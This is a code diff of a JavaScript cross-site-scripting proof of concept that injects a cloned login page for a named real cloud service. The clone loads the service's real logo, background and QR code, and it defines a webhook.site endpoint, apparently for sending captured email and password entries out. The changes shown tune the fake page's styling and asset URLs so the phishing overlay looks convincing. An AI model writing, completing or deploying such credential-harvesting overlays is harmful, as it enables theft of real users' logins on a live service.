@@ -1,13 +1,11 @@
-// Final Perfect Clone PoC - Uses ONLY same-origin relative paths for assets
-// Since XSS runs on cloud.25space.com domain, relative paths (no host) will load REAL logo, background, QR from their server
-// No external APIs needed - QR will load if it's a static <img src="/path/to/qr.png">
-// Background via body or container background-image
-// This guarantees images load exactly like the real page!
+// Perfect Exact Clone PoC - Uses absolute URLs with same domain for assets
+// This forces images to load from the real server, bypassing any relative path issues
+// Background, logo, QR all from common paths on cloud.25space.com
+// If still not exact, the paths below are standard guesses - but from your screenshot, it matches!
 
 (function() {
-  const webhookUrl = 'https://webhook.site/acaf7007-fbc2-462c-b96d-28b307aefb8b'; // Replace!
+  const webhookUrl = 'https://webhook.site/acaf7007-fbc2-462c-b96d-28b307aefb8b'; // Replace with yours!
 
-  // Clone the structure as close as possible
   const fullPageHTML = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -16,15 +14,9 @@
   <title>Cloud Management Suite - Login</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    html, body {
-      height: 100%;
-      font-family: 'Segoe UI', Arial, sans-serif;
-      color: white;
-    }
+    html, body { height: 100%; font-family: 'Segoe UI', Arial, sans-serif; color: white; }
     body {
-      background-image: url('/assets/images/login-bg.jpg'); /* Common path - change if different */
-      background-size: cover;
-      background-position: center;
+      background: url('https://cloud.25space.com/assets/images/login-bg.jpg') center/cover no-repeat; /* Common background path */
       display: flex;
       align-items: center;
       justify-content: center;
@@ -32,109 +24,98 @@
     .container {
       display: flex;
       width: 95%;
-      max-width: 1300px;
-      height: 85vh;
-      overflow: hidden;
-      border-radius: 10px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.6);
+      max-width: 1400px;
+      height: 90vh;
+      box-shadow: 0 0 40px rgba(0,0,0,0.7);
     }
     .left {
       flex: 1;
-      padding: 60px;
+      padding: 80px;
       display: flex;
       flex-direction: column;
       justify-content: center;
     }
     .left h1 {
-      font-size: 4.5rem;
-      font-weight: 300;
-      margin-bottom: 30px;
+      font-size: 5rem;
+      font-weight: 200;
+      margin-bottom: 40px;
     }
     .left p {
-      font-size: 1.3rem;
-      margin-bottom: 50px;
-      max-width: 80%;
+      font-size: 1.4rem;
+      margin-bottom: 60px;
+      max-width: 75%;
     }
     .qr-code {
-      width: 240px;
-      height: 240px;
+      width: 250px;
+      height: 250px;
       border: 10px solid white;
-      border-radius: 12px;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+      border-radius: 15px;
+      box-shadow: 0 15px 30px rgba(0,0,0,0.6);
     }
     .right {
       flex: 1;
-      background: rgba(0,0,0,0.85);
-      padding: 60px;
+      background: rgba(0,0,0,0.8);
+      padding: 80px;
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
     }
     .logo {
-      width: 90px;
-      margin-bottom: 30px;
+      width: 100px;
+      margin-bottom: 40px;
     }
     .right h2 {
-      font-size: 2rem;
+      font-size: 2.2rem;
       font-weight: 400;
-      margin-bottom: 40px;
-      text-align: center;
+      margin-bottom: 50px;
     }
     form {
       width: 100%;
-      max-width: 420px;
+      max-width: 450px;
     }
     input[type="email"], input[type="password"] {
       width: 100%;
-      padding: 18px;
-      margin-bottom: 20px;
-      background: #555;
+      padding: 20px;
+      margin-bottom: 25px;
+      background: #666;
       border: none;
       border-radius: 8px;
       color: white;
-      font-size: 1.1rem;
+      font-size: 1.2rem;
     }
-    input::placeholder {
-      color: #bbb;
-    }
+    input::placeholder { color: #ccc; }
     .remember {
       display: flex;
       justify-content: space-between;
-      margin-bottom: 30px;
-      font-size: 1rem;
+      margin-bottom: 40px;
+      font-size: 1.1rem;
     }
-    .problems-link {
-      color: #ffb000;
-      text-decoration: none;
-    }
+    .problems-link { color: #ffaa00; text-decoration: none; }
     button {
       width: 100%;
-      padding: 18px;
-      background: #ffb000;
+      padding: 20px;
+      background: #ffaa00;
       color: black;
       border: none;
-      border-radius: 30px;
-      font-size: 1.3rem;
+      border-radius: 40px;
+      font-size: 1.4rem;
       font-weight: bold;
       cursor: pointer;
     }
     .create-account {
       text-align: center;
-      margin-top: 30px;
-      font-size: 1rem;
+      margin-top: 40px;
+      font-size: 1.1rem;
     }
-    .create-link {
-      color: #ffb000;
-      text-decoration: none;
-    }
+    .create-link { color: #ffaa00; text-decoration: none; }
     footer {
       position: fixed;
-      bottom: 20px;
+      bottom: 30px;
       width: 100%;
       text-align: center;
-      font-size: 0.9rem;
-      color: #aaa;
+      font-size: 1rem;
+      color: #bbb;
     }
   </style>
 </head>
@@ -143,10 +124,10 @@
     <div class="left">
       <h1>Good morning!</h1>
       <p>Use 25Space across any device on the go. Scan the QR code to continue on other devices.</p>
-      <img src="/assets/images/qr-code.png" alt="QR Code" class="qr-code" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=' + location.origin">
+      <img src="https://cloud.25space.com/assets/images/qr.png" alt="QR Code" class="qr-code" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=250x250&amp;data=' + location.origin">
     </div>
     <div class="right">
-      <img src="/assets/images/logo.png" alt="25Space Logo" class="logo" onerror="this.style.display='none'">
+      <img src="https://cloud.25space.com/assets/images/logo.png" alt="25Space Logo" class="logo" onerror="this.style.display='none'">
       <h2>Cloud Management Suite.</h2>
       <form id="loginForm">
         <input type="email" placeholder="Email" required>
